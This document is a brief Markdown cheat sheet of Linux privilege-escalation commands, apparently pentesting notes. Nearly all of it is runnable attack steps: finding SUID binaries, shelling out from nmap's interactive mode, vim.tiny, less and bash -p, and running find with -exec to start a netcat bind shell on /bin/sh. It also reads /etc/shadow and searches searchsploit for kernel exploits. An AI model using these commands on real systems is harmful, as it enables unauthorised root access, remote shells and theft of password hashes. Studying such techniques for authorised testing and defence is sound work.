
# Privillege Escalation

### ry the obvious - Maybe the user can sudo to root:

`sudo su`

### List all SUID files 

`find / -perm -4000 2>/dev/null`

`find / -user root -perm -4000 -print 2>/dev/null`

`find / -perm -u=s -type f 2>/dev/null`

`find / -user root -perm -4000 -exec ls -ldb {} \;`

Nmap version [2.02 - 5.21]

`nmap -V`

`nmap --interactive`

`nmap> !sh`


### Performing privilege escalation by misconfigured SUID

#### Find

`touch kitsun3sec` && `find kitsun3sec -exec whoami \;`

if root

`find kitsun3sec -exec netcat -lvp 5555 -e /bin/sh \;`

#### vim.tiny 

` vim.tiny /etc/shadow `

```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

#### Bash

`bash -p`

`whoami`

#### Less

```
less /etc/passwd
!/bin/sh
```

### Listing process

`ps aux`

`ps xaf`

### Determine the current version of Linux 

`cat /etc/issue`

`lsb_release -a`

### Determine more information about the environment

`uname -a`

## Searchsploit

`searchsploit linux 2.6`

`searchsploit centos 6`